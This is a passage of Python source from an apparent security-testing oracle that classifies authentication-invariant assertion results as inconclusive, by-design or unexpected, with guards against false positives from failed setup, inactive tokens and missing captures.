                    evidence={
                        "assertion": check.assertion,
                        "reason": "baseline_check_failed",
                        "note": "A preceding baseline diversity check failed, indicating "
                                "the test infrastructure cannot distinguish principals. "
                                "This is NOT a security finding.",
                    },
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (baseline failed) — {check.assertion}")
                continue

            # ── Fix 3: Inactive-token / failed-setup capture guard ──
            # For assertions comparing entity_ids (e.g., A_entity_id != B_entity_id),
            # check if any referenced entity_id is associated with:
            # (a) an inactive token (*_active == False) — the entity_id is not from
            #     a real authentication, it's a capture fallthrough artifact
            # (b) a failed setup step (connector_id == None) — the test couldn't
            #     establish the prerequisite
            if "entity_id" in check.assertion or "identity_id" in check.assertion:
                _norm_a_eid = self.assertion_engine._normalize_template_syntax(check.assertion) if hasattr(self, 'assertion_engine') else check.assertion
                _entity_vars_in_check = _re.findall(r'(\w+(?:entity_id|identity_id))\b', _norm_a_eid)
                _inactive_entity_vars = []
                _failed_setup_vars = []
                for _ev in _entity_vars_in_check:
                    # Extract user prefix: user_A_exchanged_entity_id → user_A_exchanged
                    _prefix = _ev.rsplit("_entity_id", 1)[0] if "_entity_id" in _ev else _ev.rsplit("_identity_id", 1)[0]
                    # Check (a): associated *_active capture is False
                    _active_key = f"{_prefix}_active"
                    _active_val = self.captures.get(_active_key)
                    if _active_val is False or _active_val == "false" or _active_val == "False":
                        _inactive_entity_vars.append((_ev, _active_key, _active_val))
                    # Check (b): associated login failed
                    _login_success_key = f"{_prefix}_login_success"
                    _login_success_val = self.captures.get(_login_success_key)
                    if _login_success_val is False or _login_success_val == "false":
                        _inactive_entity_vars.append((_ev, _login_success_key, _login_success_val))
                # Check for failed setup (connector_id=None that the assertion depends on)
                _connector_vars_in_caps = [
                    k for k in self.captures
                    if k.endswith("_connector_id") and "sso" not in k
                    and self.captures[k] is None
                ]
                if _connector_vars_in_caps:
                    # Check if the assertion references entities that used this connector
                    _failed_setup_vars = _connector_vars_in_caps

                if _inactive_entity_vars:
                    _details = {ev: f"{key}={val}" for ev, key, val in _inactive_entity_vars}
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — entity_id derived from inactive/failed token. "
                            f"Variables {_details} indicate the underlying authentication "
                            f"did not produce a valid session. The entity_id value is a "
                            f"capture fallthrough artifact, not a real identity binding. "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "inactive_token_entity_id",
                            "inactive_details": _details,
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (inactive token entity) — {check.assertion}")
                    continue

                if _failed_setup_vars and len(_entity_vars_in_check) >= 2:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — setup prerequisite failed. "
                            f"Connector/setup variables are None ({_failed_setup_vars}), "
                            f"indicating the test could not establish distinct auth paths. "
                            f"Entity ID comparison is meaningless when both paths use "
                            f"the same authentication source. "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "setup_connector_failed",
                            "null_connectors": _failed_setup_vars,
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (setup connector None) — {check.assertion}")
                    continue

            try:
                # Check if ANY referenced variable is None or missing → INCONCLUSIVE
                # This prevents None-vs-value comparisons from being classified
                # as UNEXPECTED (false positives from failed verify events).
                # Also catches variables that don't exist in captures at all
                # (e.g., LLM invents "_admin" suffix variables).
                _norm_assertion = self.assertion_engine._normalize_template_syntax(check.assertion) if hasattr(self, 'assertion_engine') else check.assertion
                # Strip quoted string literals before extracting variable names so that
                # "p_policy_name" in assertions is not mistaken for a variable reference.
                _stripped_assertion = _re.sub(r'"[^"]*"|\'[^\']*\'', '""', _norm_assertion)
                var_names = _re.findall(r'[a-zA-Z_]\w*', _stripped_assertion)
                # Filter out keywords and string literals
                _keywords = {'true', 'false', 'True', 'False', 'None', 'null', 'not', 'in',
                             'is', 'and', 'or', 'AND', 'OR', 'NOT', 'IN', 'IS', 'len',
                             'ok', 'error', 'NextMfa', 'status', 'Evaluation', 'Implication'}
                candidate_vars = [v for v in var_names if v not in _keywords and len(v) > 2]
                referenced_vars = [v for v in candidate_vars if v in self.captures]
                missing_vars = [v for v in candidate_vars if v not in self.captures and not v.startswith('"')]
                none_vars = [v for v in referenced_vars if self.captures.get(v) is None]
                # Combine: variables that are None OR completely missing from captures
                problem_vars = none_vars + missing_vars
                if problem_vars:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — variables with None value: {none_vars}"
                            + (f", missing from captures: {missing_vars}" if missing_vars else "")
                            + f". Verify events likely failed. Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "none_variables": none_vars,
                            "missing_variables": missing_vars,
                            "note": "Verify events returned empty/error responses. "
                                    "This is NOT a security finding — it's an infrastructure failure.",
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (None: {none_vars}, missing: {missing_vars}) — {check.assertion}")
                    continue

                result, explanation = self.assertion_engine.evaluate(
                    check.assertion, self.captures
                )

                if result is False:
                    # Distinguish real failures from infrastructure failures:
                    # if explanation mentions None variables, it's INCONCLUSIVE
                    is_none_failure = ("variable not captured" in explanation or
                                       "variable captured as None" in explanation)
                    # HTTP status=0 means the request never completed (event
                    # failed at setup time). Any *_status variable equal to 0
                    # is an infrastructure failure, not a security finding.
                    status_zero_vars = [
                        v for v in referenced_vars
                        if v.endswith('_status') and self.captures.get(v) == 0
                    ]
                    is_infra_failure = is_none_failure or bool(status_zero_vars)

                    # ── Fix 1: Control-path failure in compound AND assertions ──
                    # When an assertion is `A == 200 AND B >= 400` (control + attack),
                    # if the control sub-assertion (A == 200) fails, the whole
                    # assertion is a control-path failure — the test infrastructure
                    # couldn't establish the baseline, so the attack result is
                    # meaningless. Mark as INCONCLUSIVE.
                    is_control_path_failure = False
                    _norm_assert = self.assertion_engine._normalize_template_syntax(check.assertion) if hasattr(self, 'assertion_engine') else check.assertion
                    _and_parts, _and_ops = self.assertion_engine._split_logical(_norm_assert)
                    if len(_and_parts) >= 2 and all(op == "AND" for op in _and_ops):
                        for _sub_expr in _and_parts:
                            _sub_expr_s = _sub_expr.strip()
                            # Detect "success check" sub-assertions: var == 200, var == true
                            _success_check = _re.match(
                                r'(\w+)\s*==\s*(200|201|"?true"?|"?ok"?)\s*$',
                                _sub_expr_s, _re.IGNORECASE
                            )
                            if _success_check:
                                _ctrl_var = _success_check.group(1)
                                _ctrl_val = self.captures.get(_ctrl_var)
                                # Also try alias resolution
                                if _ctrl_val is None:
                                    _ctrl_val = self.assertion_engine._lookup_capture(_ctrl_var, self.captures)
                                _expected = _success_check.group(2)
                                # Check if the control sub-assertion failed
                                if _expected in ("200", "201"):
                                    if _ctrl_val is not None and _ctrl_val != int(_expected) and _ctrl_val != _expected:
                                        is_control_path_failure = True
                                        logger.info(
                                            f"  [CONTROL-PATH] Control sub-assertion failed: "
                                            f"{_ctrl_var}={_ctrl_val!r} (expected {_expected}). "
                                            f"Marking compound assertion as INCONCLUSIVE."
                                        )
                                        break
                                elif str(_ctrl_val).lower() != _expected.strip('"').lower():
                                    is_control_path_failure = True
                                    break
                    if is_control_path_failure:
                        is_infra_failure = True

                    # Fix: Single-assertion control checks.
                    # When the assertion is `ctrl_X == 200` (single check, no AND)
                    # and the variable name contains control/ctrl/baseline, a failure
                    # means the test precondition didn't hold — not a vulnerability.
                    if not is_infra_failure and len(_and_parts) == 1:
                        _single = _and_parts[0].strip()
                        _ctrl_match = _re.match(
                            r'(\w*(?:control|ctrl|baseline|first|session[A-Z])[_\w]*)\s*==\s*(\d+)',
                            _single, _re.IGNORECASE
                        )
                        if _ctrl_match:
                            _cv = self.captures.get(_ctrl_match.group(1))
                            if _cv is None:
                                _cv = self.assertion_engine._lookup_capture(_ctrl_match.group(1), self.captures)
                            _expected_val = int(_ctrl_match.group(2))
                            if _cv is not None and int(_cv) != _expected_val:
                                is_infra_failure = True
                                logger.info(
                                    f"  [CONTROL-PATH] Single control assertion failed: "
                                    f"{_ctrl_match.group(1)}={_cv!r} (expected {_expected_val}). "
                                    f"Marking as INCONCLUSIVE."
                                )

                    # Fix: Range-check control sub-assertions in compound AND.
                    # Pattern: `var >= 200 AND var < 300` — if var is 400+,
                    # the control step failed.
                    if not is_infra_failure and len(_and_parts) >= 2:
                        for _sub in _and_parts:
                            _range_match = _re.match(
                                r'(\w+)\s*<\s*(300|400)',
                                _sub.strip(), _re.IGNORECASE
                            )
                            if _range_match:
                                _rv = self.captures.get(_range_match.group(1))
                                if _rv is None:
                                    _rv = self.assertion_engine._lookup_capture(_range_match.group(1), self.captures)
                                _bound = int(_range_match.group(2))
                                if _rv is not None and int(_rv) >= _bound:
                                    is_infra_failure = True
                                    logger.info(
                                        f"  [CONTROL-PATH] Range check failed: "
                                        f"{_range_match.group(1)}={_rv!r} (expected < {_bound}). "
                                        f"Marking as INCONCLUSIVE."
                                    )
                                    break

                    # When the violation_description contains precondition language,
                    # the test setup itself failed — not a vulnerability finding.
                    _PRECONDITION_PATTERNS = [
                        "precondition", "control check", "baseline",
                        "setup may be invalid", "cannot test", "cannot evaluate",
                        "did not establish", "could not establish",
                        "did not produce", "could not produce",
                        "invalidating the", "preventing evaluation",
                        "inconclusive",
                        # Control-path failure patterns
                        "control path failed", "control failed",
                        "should succeed", "should complete",
                        "reducing confidence", "weakening confidence",
                        "not meaningfully tested", "not meaningfully exercised",
                        "cannot be meaningfully", "not interpretable",
                        "control redemption", "control authorization",
                        "control refresh", "control exchange",
                        "control code exchange failed",
                        "unable to confirm",
                    ]
                    _desc_lower = (check.violation_description or "").lower()
                    # Also check the assertion_description (implication text)
                    _assert_desc = (getattr(check, 'assertion_description', '') or '').lower()
                    _combined_desc = _desc_lower + " " + _assert_desc
                    is_precondition = any(p in _combined_desc for p in _PRECONDITION_PATTERNS)

                    # `status == "ok"` but status is 'error'. When the assertion
                    # is a simple status equality check against "ok" and it fails,
                    # this is always a control/baseline failure.
                    _assertion_norm = check.assertion.strip()
                    if (not is_precondition
                            and ('== "ok"' in _assertion_norm or "== 'ok'" in _assertion_norm)
                            and explanation
                            and "'error'" in explanation):
                        is_precondition = True

                    if is_infra_failure:
                        _vtype = VerdictType.INCONCLUSIVE
                        _conf = "LOW"
                        _desc_prefix = ""
                    elif is_precondition:
                        _vtype = VerdictType.BY_DESIGN
                        _conf = "LOW"
                        _desc_prefix = "[Precondition] "
                    else:
                        _vtype = VerdictType.UNEXPECTED
                        _conf = "MEDIUM"
                        _desc_prefix = ""

                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=_vtype,
                        confidence=_conf,
                        description=(
                            f"{_desc_prefix}Assertion FAILED: {check.assertion}\n"
                            f"Evaluation: {explanation}\n"
                            f"Implication: {check.violation_description}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "evaluation": explanation,
                            "captured_values": {
                                k: v for k, v in self.captures.items()
                                if k in check.assertion
                            },
                        },
                        cve_pattern=check.cve_analog if not (is_infra_failure or is_precondition) else "",
                        requires_manual_review=not (is_infra_failure or is_precondition),
                    )
                else:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.BY_DESIGN,
                        confidence="HIGH",
                        description=f"Assertion held: {check.assertion}. {explanation}",
                        evidence={},
                        cve_pattern="",
                        requires_manual_review=False,
                    )

            except Exception as e:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.ERROR,
                    confidence="LOW",
                    description=f"Assertion evaluation error: {e}",
                    evidence={"assertion": check.assertion, "error": str(e)},
                    cve_pattern="",
                    requires_manual_review=True,
                )

            verdicts.append(verdict)
            logger.info(
                f"  Oracle [{check.invariant}]: {verdict.verdict_type.value} — {check.assertion}"
            )

            # Baseline check failure detection: if a check whose check_id
            # contains "baseline" fails (not BY_DESIGN), mark all subsequent
            # checks as INCONCLUSIVE.
            _check_id = getattr(check, 'check_id', '') or ''
            if "baseline" in _check_id.lower() and verdict.verdict_type not in (
                VerdictType.BY_DESIGN, VerdictType.REJECTED
            ):
                baseline_failed = True
                logger.info(f"  [BASELINE] Check '{_check_id}' failed — subsequent checks will be INCONCLUSIVE")

        return verdicts
